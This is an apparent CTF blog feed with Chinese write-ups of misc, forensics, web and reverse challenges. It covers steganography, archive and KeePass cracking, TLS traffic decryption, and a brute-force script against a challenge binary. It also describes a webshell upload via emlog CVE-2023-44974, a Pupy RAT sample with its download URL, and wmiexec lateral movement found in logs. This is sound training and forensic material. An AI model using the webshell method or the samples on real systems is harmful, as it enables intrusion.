<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>w3nx1z1</title>
  
  <subtitle>w3nx1z1 Blog</subtitle>
  <link href="http://w3nx1z1.github.io/atom.xml" rel="self"/>
  
  <link href="http://w3nx1z1.github.io/"/>
  <updated>2024-08-28T13:47:15.956Z</updated>
  <id>http://w3nx1z1.github.io/</id>
  
  <author>
    <name>w3nx1z1</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2024羊城杯MISC方向wp</title>
    <link href="http://w3nx1z1.github.io/2024/08/28/2024%E7%BE%8A%E5%9F%8E%E6%9D%AFMISC%E6%96%B9%E5%90%91wp/"/>
    <id>http://w3nx1z1.github.io/2024/08/28/2024%E7%BE%8A%E5%9F%8E%E6%9D%AFMISC%E6%96%B9%E5%90%91wp/</id>
    <published>2024-08-28T13:46:47.290Z</published>
    <updated>2024-08-28T13:47:15.956Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024羊城杯MISC方向wp"><a href="#2024羊城杯MISC方向wp" class="headerlink" title="2024羊城杯MISC方向wp"></a>2024羊城杯MISC方向wp</h1><p>真是叹为观止的一场比赛 见识到众多本科组ctf大手子们熬夜上分 最后半小时神仙打架 最后一分钟疯狂交题更是让在下大开眼界 </p><p>但是苦于没有队友 只能自己浅做一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281606294.png" alt="image-20240828160658179"></p><h2 id="不一样的数据库-2"><a href="#不一样的数据库-2" class="headerlink" title="不一样的数据库_2"></a>不一样的数据库_2</h2><p>附件拿到一个压缩包 真加密 010打开 翻到最下面 找到提示 密码是6位数字</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281609396.png" alt="image-20240828160902327"></p><p>爆破一下密码 为<code>753951</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281609493.png" alt="image-20240828160930428"></p><p>解压得到一张残缺的二维码和一个kdbx的Keepass数据库 先修复二维码 这个很好弄 就是补全三个定位点就可以了</p><p>直接截一个正常二维码的定位点 然后用PS粘上去就可以扫</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281617426.png" alt="image-20240828161721363"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281618936.png" alt="image-20240828161820866"></p><p>得到<code>NRF@WQUKTQ12345&amp;WWWF@WWWFX#WWQXNWXNU</code></p><p>使用Keepass打开数据库 需要输入密码 但是发现直接输入上面扫出来的字符串不能直接解密 发现给的附件中的残缺二维码的名字是13 联想到rot13 解密一下得到<code>AES@JDHXGD12345&amp;JJJS@JJJSK#JJDKAJKAH</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281628267.png" alt="image-20240828162807192"></p><p>成功打开数据库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281628359.png" alt="image-20240828162847235"></p><p>先看到一个<code>passisDASCTF</code>  同时看到群组名字是AES 那下面就是找一下密文 </p><h3 id="查看编辑记录"><a href="#查看编辑记录" class="headerlink" title="查看编辑记录"></a>查看编辑记录</h3><p>右击选择编辑记录 可以找到修改密码记录的历史 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281636863.png" alt="image-20240828163642789"></p><p>选择最后面两条记录的任意一条 选择<code>高级</code> 可以看到一个字段名为<code>aes</code>就是密文 值有很明显的<code>U2Fsd</code>AES加密头 直接使用密码进行AES解密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281638684.png" alt="image-20240828163849623"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281640368.png" alt="image-20240828164012316"></p><h2 id="so-much"><a href="#so-much" class="headerlink" title="so+much"></a>so+much</h2><p>原题 没什么好说的 拿到的ad1镜像文件 名字为<code>c2hpZnQh</code>  解base64是<code>shift! </code></p><p>使用010打开 发现有提示 和<code>123456</code> 结合shift 可以想到密码是按住shift键的123456 也就是<code>!@#$%^</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281641657.png" alt="image-20240828164137592"></p><p>解密ad1镜像文件 使用FTK imager  File——Decrypt AD1 image 得到解密后的<code>c2hpZnQh-decrypted.ad1</code> 在使用FTK进行挂载</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281656295.png" alt="image-20240828165614222"></p><p>打开挂载上的镜像 发现很多<code>.crypto</code>文件 同时时间戳只有两种 猜测是转二进制 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281658327.png" alt="image-20240828165833261"></p><p>因为挂载的时候是只读模式 我们需要把这些文件都先单独复制出来 写脚本 先提取时间戳 可以发现时间少的是<code>1628151585.73009</code> 因此转化为0 反之则为1</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281700567.png" alt="image-20240828170014520"></p><pre><code class="python">import oslist = [&#39;&#39;]*344i = 0for j in range(344):    list[j] = os.path.getmtime(str(j)+&#39;.crypto&#39;)# print(list)flag = &#39;&#39;for i in range(344):    if(str(list[i]) == &#39;1628151585.73009&#39;):        flag += &#39;0&#39;    else:        flag += &#39;1&#39;print(flag)tmp = &#39;&#39;for k in range(len(flag)):    tmp += flag[k]    if len(tmp) == 8:        print(chr(int(tmp,2)),end=&#39;&#39;)        tmp = &#39;&#39;        # the_key_is_700229c053b4ebbcf1a3cc37c389c4fa</code></pre><p>得到解密crypto文件的密码是<code>700229c053b4ebbcf1a3cc37c389c4fa</code>  解密需要的工具是<code>Encrypto </code> 我们只需要找两个时间戳不一样的文件进行解密就可以了  两个文件内容拼起来就是flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281703623.png" alt="image-20240828170309574"></p><h2 id="hiden"><a href="#hiden" class="headerlink" title="hiden"></a>hiden</h2><p>附件一个wav文件 一个需要解密内容的文件 文件名<code>60=()+()</code> 直接猜测是13+47 需要进行rot47+rot13解密</p><p>得到加密脚本</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281706170.png" alt="image-20240828170653049"></p><pre><code class="python">import wave with open(&#39;flag.txt&#39;, &#39;rb&#39;) as f:    txt_data = f.read()    file_len = len(txt_data)    txt_data = file_len.to_bytes(3, byteorder = &#39;little&#39;) + txt_datawith wave.open(&quot;test.wav&quot;, &quot;rb&quot;) as f:    attrib = f.getparams()        wav_data = bytearray( f.readframes(-1) )for index in range(len(txt_data)):    wav_data[index * 4] = txt_data[index]    with wave.open(&quot;hiden.wav&quot;, &quot;wb&quot;) as f:    f.setparams(attrib)     f.writeframes(wav_data)</code></pre><p>直接ai跑个解密脚本 就能提取出flag.txt的内容</p><pre><code class="python">import wave# 打开hiden.wav文件with wave.open(&quot;hiden.wav&quot;, &quot;rb&quot;) as f:    # 获取音频参数    num_frames = f.getnframes()    wav_data = bytearray(f.readframes(num_frames))# 提取隐藏的内容hidden_data = bytearray()length_of_hidden_data = 0# 先提取长度for index in range(3):    hidden_data.append(wav_data[index * 4])# 得到隐藏数据的长度length_of_hidden_data = int.from_bytes(hidden_data[:3], byteorder=&#39;little&#39;)# 提取隐藏的文本数据hidden_data = bytearray()for index in range(length_of_hidden_data):    hidden_data.append(wav_data[(index + 3) * 4])  # 继续提取，跳过长度的部分# 将提取的内容写入flag.txtwith open(&#39;extracted_flag.txt&#39;, &#39;wb&#39;) as f:    f.write(hidden_data)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281708578.png" alt="image-20240828170805516"></p><h2 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin"></a>Checkin</h2><p>在附件压缩包中找到一条注释</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281721518.png" alt="image-20240828172100396"></p><p>解一下 是base58 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281721503.png" alt="image-20240828172140427"></p><p>只给了一个txt文件 是16进制 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281717828.png" alt="image-20240828171746771"></p><p>放到010中 发现是一个流量包 单独保存出来进行分析 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281718443.png" alt="image-20240828171843381"></p><p>很多TLS 找办法找到解密日志 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281719729.png" alt="image-20240828171934648"></p><p>txt文档中存在wbstego隐写 密码就使用上面注释解出来的 导出来的文件保存为<code>1.log</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281727476.png" alt="image-20240828172703379"></p><p>将这个解密日志 导入到流量包中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281732672.png" alt="image-20240828173249610"></p><p>成功解密 追踪http流 找到一个flag.gif </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281733626.png" alt="image-20240828173356544"></p><p>提取出来 先分析一波帧间隔 很好 有规律 也是转二进制 小的是0 大的是1</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281734852.png" alt="image-20240828173432763"></p><p>解一下二进制 出flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281734768.png" alt="image-20240828173458686"></p><h2 id="miaoro"><a href="#miaoro" class="headerlink" title="miaoro"></a>miaoro</h2><p>给到的附件是一个流量包 先追踪一下tcp流 </p><p>可以看到请求包GWHT字段是一个base64加密的值 在下面的返回包 也是base64加密的值 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408282034434.png" alt="image-20240828203403305"></p><p>解密看一下 可以看到GWHT部分应该是命令执行的部分 下面返回包就是命令执行的结果 出现命令执行部分也对应着题干中的被攻击</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408282035954.png" alt="image-20240828203510872"></p><p>继续向后看 在第10个包找到一个密码<code>Th15_11111111s_pP@sssssw000rd!!!</code>    在第13个包找到一个<code>secret.txt</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408282037589.png" alt="image-20240828203700485"></p><p>将secret.txt的返回包部分提取出来 是一个逆序的压缩包的16进制 进行操作之后将压缩包保存下来 使用上面找到的密码进行解压</p><p>得到一个flag2.jpg</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408282039462.png" alt="image-20240828203941411"></p><p>看起来很奇怪 猜测是宽高问题 尝试爆破crc无果 将宽高对调 并适当增加对调后的高度 恢复出正常的图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408282041359.jpg" alt="flag2"></p><p>在网上找到对应的解码对照表</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408282042863.png" alt="image-20240828204239767"></p><p>得到flag2：EBOFDELQDIAA}</p><p>再次结合题干说的被工具攻击 来分析一下请求包中的Cookie 使用shiro反序列化解密工具 可以在第二个cookie中解出flag1</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408282046376.png" alt="image-20240828204626281"></p><p>拼起来就是</p><pre><code>DASCTF&#123;B916CFEB-C40F-45D6-A7BC-EBOFDELQDIAA&#125;</code></pre><h2 id="1z-misc"><a href="#1z-misc" class="headerlink" title="1z_misc"></a>1z_misc</h2><p>挺无语的一道misc 只能说很有misc风格 纯纯猜谜+缝合 前部分就是结合星宿 猜压缩包解压密码 是<code>E@SI1Y!</code></p><p>解出来之后是一张<code>天琴座</code>图片和一个flag 就是2024ISCC的有人让我给你带个话这个题 难点在于工具的安装</p><p>下面放两篇文章 就不赘述了</p><pre><code>https://blog.csdn.net/qq_36959443/article/details/116136965</code></pre><pre><code>https://blog.csdn.net/administratorlws/article/details/139154964?ops_request_misc=%257B%2522request%255Fid%2522%253A%252239915FCB-333C-46C6-879E-240F264B325F%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=39915FCB-333C-46C6-879E-240F264B325F&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-139154964-null-null.142^v100^pc_search_result_base4&amp;utm_term=iscc%20%E6%9C%89%E4%BA%BA%E8%AE%A9%E6%88%91%E7%BB%99%E4%BD%A0%E5%B8%A6%E4%B8%AA%E8%AF%9D&amp;spm=1018.2226.3001.4187</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024羊城杯MISC方向wp&quot;&gt;&lt;a href=&quot;#2024羊城杯MISC方向wp&quot; class=&quot;headerlink&quot; title=&quot;2024羊城杯MISC方向wp&quot;&gt;&lt;/a&gt;2024羊城杯MISC方向wp&lt;/h1&gt;&lt;p&gt;真是叹为观止的一场比赛 见识到众多本</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>2024ISG观安杯</title>
    <link href="http://w3nx1z1.github.io/2024/08/20/2024ISG%E8%A7%82%E5%AE%89%E6%9D%AF/"/>
    <id>http://w3nx1z1.github.io/2024/08/20/2024ISG%E8%A7%82%E5%AE%89%E6%9D%AF/</id>
    <published>2024-08-20T05:55:25.347Z</published>
    <updated>2024-08-20T05:56:11.213Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024ISG观安杯"><a href="#2024ISG观安杯" class="headerlink" title="2024ISG观安杯"></a>2024ISG观安杯</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="R-emm-w3nx1z1"><a href="#R-emm-w3nx1z1" class="headerlink" title="R | emm | w3nx1z1"></a>R | emm | w3nx1z1</h3><p>前面就是正常的随便输入用户密码邮箱 进行安装 然后登陆后台</p><p>找到一个emlog的任意文件上传漏洞CVE-2023-44974</p><p>在插件处上传webshell压缩包 要求是文件夹要和webshell的名字相同 可以用这个里面的</p><p><a href="https://github.com/yangliukk/emlog/tree/main">https://github.com/yangliukk/emlog/tree/main</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351954.png" alt="img"></p><p>然后访问webshell 执行命令 得到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351339.png" alt="img"></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="R-rev-shell-解题人"><a href="#R-rev-shell-解题人" class="headerlink" title="R | rev_shell | 解题人"></a>R | rev_shell | 解题人</h3><p>先看日志文件</p><p>跑一下程序对照，拿到cipher和key</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351776.png" alt="img"></p><p>再看可执行文件</p><p>die查壳</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351453.png" alt="img"></p><p>upx壳，工具脱不了，一开始以为是工具版本的问题，后来发现github最新版是4.2.4，但是题目是4.3，猜测可能是魔改？</p><p>再尝试下断点手脱，但是报错</p><p>再尝试直接跑起来attach，成功附加但是没dump下来，堵死</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351139.png" alt="img"></p><p>最后尝试直接爆破，先测试出明文长度37</p><p>大小写字母数字以及下划线组合，找pwn手from pwn写按位爆破脚本</p><pre><code class="Python">from struct import packfrom ctypes import *from LibcSearcher import *from pwn import *context(arch=&#39;amd64&#39;,log_level=&#39;debug&#39;)#context(arch=&#39;i386&#39;,log_level=&#39;debug&#39;)def s(a):    io.send(a)    def sa(a, b):    io.sendafter(a, b)def sl(a):    io.sendline(a)def sla(a, b):    io.sendlineafter(a, b)def r():    io.recv()def pr():    print(io.recv())def rl(a):    return io.recvuntil(a)def inter():    io.interactive()def debug():    gdb.attach(io)    pause()def get_addr():    return u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))def ret_csu(r12, r13, r14, r15, last):    payload = offset * &#39;a&#39;    #构造栈溢出的padding    payload += p64(gadget1)    #gadgets1的地址    payload += p64(0) + p64(1)    #rbx=0, rbp=1    payload += p64(r12)    #call调用的地址    payload += p64(r13) + p64(r14) + p64(r15)    #三个参数的寄存器    payload += p64(gadget2)    #gadgets2的地址    payload += &#39;a&#39; * 56    #pop出的padding    payload += p64(last)    #函数最后的返回地址    return payloadio=process(&#39;./encsh&#39;)#io=remote(&#39;&#39;,)#elf=ELF(&#39;./&#39;)#libc=ELF(&#39;./&#39;)import stringkey = &#39;mykeymykeyhackergoawayyourkeyyou&#39;flag = &#39;00000000000000000000000000000000000000000000000000000&#39;v = [227, 83, 162, 17, 197, 102, 127, 119, 94, 208, 82, 187, 221, 191, 112, 186, 0, 170, 191, 44, 233, 242, 209, 114,     70, 116, 203, 80, 72, 65, 254, 111, 119, 146, 95, 180, 182, 77, 140, 110, 204, 249, 76, 34, 229, 39, 30, 12, 248,     89, 158, 103, 170]FLAG = &#39;&#39;sla(&#39;&gt;&#39;, &#39;key&#39;)sl(key)sla(&#39;&gt;&#39;, &#39;enc&#39;)sl(flag)rl(&#39;[&#39;)ans = rl(&#39;]&#39;).decode()temp = ans[:-1].split(&#39;, &#39;)tmp = int(temp[i])for i in range(len(v)):    for j in string.printable:        ans = flag[:i] + j + flag[i + 1:]        S(ans)        if tmp == v[i]:            FLAG += j            break        print(FLAG)        io.close()ISG&#123;ThIsisMYuPx_notYOuR5_Gg_hjD95wk1&#125;</code></pre><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="R-office-w3nx1z1"><a href="#R-office-w3nx1z1" class="headerlink" title="R | office | w3nx1z1"></a>R | office | w3nx1z1</h3><p>010打开 末尾base64 解密得到用来打开excel文档的密码</p><pre><code class="Python">SSN6aVR4bnh2YmcjR0M5   I#ziTxnxvbg#GC9</code></pre><p>打开之后发现有宏vba </p><p><img src="https://uvlucnh8giw.feishu.cn/space/api/box/stream/download/asynccode/?code=YmQ2M2ZjYzM3YWNhZDUzMDEwNDA3MDdmMzZiNDQ0MGZfZ3NnNExDYzlHWjBEOWZmR1BpZ2U4V21QeDR6T0E3T1JfVG9rZW46TVdub2JZS1A4b2FpQWJ4bHZ0ZGNSOGRIbnJnXzE3MjQxMzMwNjE6MTcyNDEzNjY2MV9WNA" alt="img"></p><p>尝试编辑宏 发现有保护密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351075.png" alt="img"></p><p>使用LibreOffice Calc打开可以消除宏</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351991.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351459.png" alt="img"></p><p>写解密脚本 恢复flag</p><pre><code class="Python">def decrypt(encrypted_message):    # 将加密字符串分割成整数字符串，并去除空字符串    message_parts = [int(part) for part in encrypted_message.split(&#39;,&#39;) if part]    # 初始化 S 数组    s = list(range(256))    j = 0    # 创建 KSA    for i in range(256):        j = (j + s[i]) % 256        s[i], s[j] = s[j], s[i]    # 初始化 x 和 y    x = 0    y = 0    decrypted_message = &quot;&quot;    # 进行解密    for i in range(len(message_parts)):        x = (x + 1) % 256        y = (y + s[x]) % 256        s[x], s[y] = s[y], s[x]                # 恢复原始字符        char = chr(s[(s[x] + s[y]) % 256] ^ message_parts[i])        decrypted_message += char    return decrypted_message# 测试代码if __name__ == &quot;__main__&quot;:    encrypted = &quot;184,116,232,38,216,127,29,89,225,84,108,82,8,0,161,49,232,127,45,252,147,140,185,210,26,107,123,2,82,189,0,167,205,130,94,54,94,242,138,139,102,79,250,139,9,142,17,42,198,113,246,6,142,31,&quot;        decrypted = decrypt(encrypted)    print(&quot;Decrypted Message:&quot;, decrypted)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201354481.png" alt="img"></p><h4 id="另外"><a href="#另外" class="headerlink" title="另外"></a>另外</h4><p>说一下另一种思路 直接在wps里面取消掉打开密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351237.png" alt="img"></p><p>密码加密里面删掉原来的密码——应用 再打开就没有密码了 olevba也可以正常使用了</p><pre><code class="Python">olevba problem.xlsm</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201354724.png" alt="img"></p><h4 id="另外2"><a href="#另外2" class="headerlink" title="另外2"></a>另外2</h4><p>还有一种消除宏保护密码的方法 在wps中另存为xls文档 使用010打开这个xls文档 找到DPB字段 改为DPX 就可以消除宏保护密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351876.png" alt="img"></p><h3 id="R-misc-see-it-w3nx1z1"><a href="#R-misc-see-it-w3nx1z1" class="headerlink" title="R | misc_see_it | w3nx1z1"></a>R | misc_see_it | w3nx1z1</h3><h4 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h4><p>t’s not what you hear, it’s what you see.</p><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>末尾压缩包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201353878.png" alt="img"></p><p>提出来解压 得到密码 p@ssw0rd_1s_myg0 还有steghide字段提示</p><p>直接解密 得到png lsb隐写得到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351366.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024ISG观安杯&quot;&gt;&lt;a href=&quot;#2024ISG观安杯&quot; class=&quot;headerlink&quot; title=&quot;2024ISG观安杯&quot;&gt;&lt;/a&gt;2024ISG观安杯&lt;/h1&gt;&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;header</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
    <category term="web" scheme="http://w3nx1z1.github.io/tags/web/"/>
    
    <category term="re" scheme="http://w3nx1z1.github.io/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>2024巅峰极客-简历</title>
    <link href="http://w3nx1z1.github.io/2024/08/17/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-%E7%AE%80%E5%8E%86/"/>
    <id>http://w3nx1z1.github.io/2024/08/17/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-%E7%AE%80%E5%8E%86/</id>
    <published>2024-08-17T15:17:08.390Z</published>
    <updated>2024-08-17T15:21:25.264Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024巅峰极客-简历"><a href="#2024巅峰极客-简历" class="headerlink" title="2024巅峰极客-简历"></a>2024巅峰极客-简历</h1><p>很好的比赛 充分发扬py精神 最后半小时疯狂冲分</p><p>题的质量不错 算是学到了新的姿势 </p><p>给到附件是一个exe文件 用010看了一眼 全是upx 判断为有壳 用upx去一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408172113204.png" alt="image-20240817211321811"></p><p>去壳之后跑了一下沙箱 发现没有毒</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408172247872.png" alt="image-20240817224758718"></p><p>但是存在检测虚拟机 直接在本机运行一下 得到两个文件<code>my.png</code> 和<code>file</code> file文件其实就是一个exe可执行程序文件</p><p>再来分析my.png zsteg跑一下 发现存在lsb隐写</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408172250120.png" alt="image-20240817225025010"></p><p>得到一个链接</p><pre><code>http://47.104.129.38/79407f2309b5763fbd0e33dc583c4262/default.a</code></pre><p>访问可以下载<code>default.a</code>  使用010打开发现存在大量相同的字符</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408172251095.png" alt="image-20240817225152030"></p><p>猜测是要与yyttddd进行异或 写脚本完成</p><pre><code class="python">def xor_with_string(file_path, xor_string):    xor_bytes = xor_string.encode()    with open(file_path, &#39;rb&#39;) as file:        file_data = file.read()    xor_result = bytearray()    for i in range(len(file_data)):        xor_result.append(file_data[i] ^ xor_bytes[i % len(xor_bytes)])    return xor_resultdef save_xor_result(xor_result, output_path):    with open(output_path, &#39;wb&#39;) as output_file:        output_file.write(xor_result)file_path = &#39;default.a&#39;output_path = &#39;output_file.exe&#39; xor_string = &#39;yyttddd&#39;xor_result = xor_with_string(file_path, xor_string)save_xor_result(xor_result, output_path)print(output_path)</code></pre><p>导出发现其实就是运行附件exe程序时释放出来的file文件 在其中发现大量pupy字段的出现</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408172306355.png" alt="image-20240817230639288"></p><p>搜索发现Pupy确实是一个C2项目</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408172307939.png" alt="image-20240817230710822"></p><p>在github上找到解密项目 需要在python2的环境下运行</p><p><a href="https://github.com/CaledoniaProject/pupyrat-config-decoder">pupyrat配置解码器</a></p><p>直接运行发现报错 主要是第28行的问题</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408172308298.png" alt="image-20240817230850198"></p><p>脚本问题无法进行反编译 那就直接输出解码后的结果tmp</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408172315087.png" alt="image-20240817231532915"></p><p>改为</p><pre><code>print(tmp)</code></pre><p>在kali中运行</p><pre><code>python2 main.py output_file.exe</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408172317112.png" alt="image-20240817231735979"></p><p>找到ip  <code>60.177.18.44</code> 进行md5加密</p><pre><code>flag&#123;b57758d5acc923137eef453239ba685b&#125;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024巅峰极客-简历&quot;&gt;&lt;a href=&quot;#2024巅峰极客-简历&quot; class=&quot;headerlink&quot; title=&quot;2024巅峰极客-简历&quot;&gt;&lt;/a&gt;2024巅峰极客-简历&lt;/h1&gt;&lt;p&gt;很好的比赛 充分发扬py精神 最后半小时疯狂冲分&lt;/p&gt;
&lt;p&gt;题的</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>TFCCTF2024之forensics</title>
    <link href="http://w3nx1z1.github.io/2024/08/04/TFCCTF%E4%B9%8Bforensics/"/>
    <id>http://w3nx1z1.github.io/2024/08/04/TFCCTF%E4%B9%8Bforensics/</id>
    <published>2024-08-03T16:52:41.779Z</published>
    <updated>2024-08-03T16:53:14.211Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TFCCTF2024之forensics"><a href="#TFCCTF2024之forensics" class="headerlink" title="TFCCTF2024之forensics"></a>TFCCTF2024之forensics</h1><p>发现最近的国际赛的取证真的好喜欢出evtx日志分析</p><p>这两道取证其实用的附件都是一样的</p><h2 id="SM-WHAT"><a href="#SM-WHAT" class="headerlink" title="SM WHAT?!"></a>SM WHAT?!</h2><pre><code>An attacker managed to gain foothold in our network, but we managed to capture the connection to our server. Analyze the file and identify the tool used to connect, the service it connected to, its IP address, and the shared resources folder.Flag format: TFCCTF&#123;tool_service_ip_share&#125;Example: TFCCTF&#123;ntlmrelayx_rdp_192.168.0.1_logs$&#125;Note: The flag is in all lowercase (except for TFCCTF).</code></pre><p>就是需要我们找连接服务器使用的工具 连接的服务名称 ip地址和共享资源文件夹的名字</p><p>首先 给我们的是一个evtx日志文件 我们先使用 <a href="https://github.com/williballenthin/python-evtx">python-evtx-master</a>这个项目 把evtx日志文件转化为更容易进行查看的xml文件 使用&#x2F;scripts文件夹下的<code>evtx_dump.py</code>  命令是</p><pre><code>python evtx_dump.py 1.evtx &gt; 1.xml</code></pre><p>然后我们找一下事件ID4688的记录 这个ID记录了进程创建的信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040036715.png" alt="image-20240804003657504"></p><p>大致可以确定 ip是127.0.0.1 共享文件夹目录是ADMIN$ 题目要求是全小写 那就是admin$</p><p>后面直接在github里面搜上面这部分的源码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040039357.png" alt="image-20240804003943104"></p><p>根据这个文件名<code>ID4688,5140,5145-WMIexec execution via SMB (GLOBAL).xml</code> 在搜一下<code>wmiexec </code> 是一种内网横向的工具</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040041053.png" alt="image-20240804004110988"></p><p>那可以确定工具是wmiexec 服务就是smb</p><p>所以flag是</p><pre><code>TFCCTF&#123;wmiexec _smb_127.0.0.1_admin$&#125;</code></pre><h2 id="HE-DID-WHAT"><a href="#HE-DID-WHAT" class="headerlink" title="HE DID WHAT?!"></a>HE DID WHAT?!</h2><pre><code>After the attacker connected to our server, he managed to extract some random data, however encrypted. We trust to decrypt it and get the flag.</code></pre><p>要找一个加密的字符串 </p><p>在事件ID4104处找到一个reverse过的base64字符串</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040044453.png" alt="image-20240804004413308"></p><p>是一个powershell的命令 里面还有个base64</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040044690.png" alt="image-20240804004436580"></p><p>解出来是个url 上一条的命令就是先对这个url进行base64解密 解出来后 再从这个url中下载<code>caca.exe</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040045658.png" alt="image-20240804004534550"></p><p>我们也访问这个url 下载到<code>caca.exe </code> 直接用ida打开报错 用DIE查了一下 是.net的程序 用dnspy打开</p><p><img 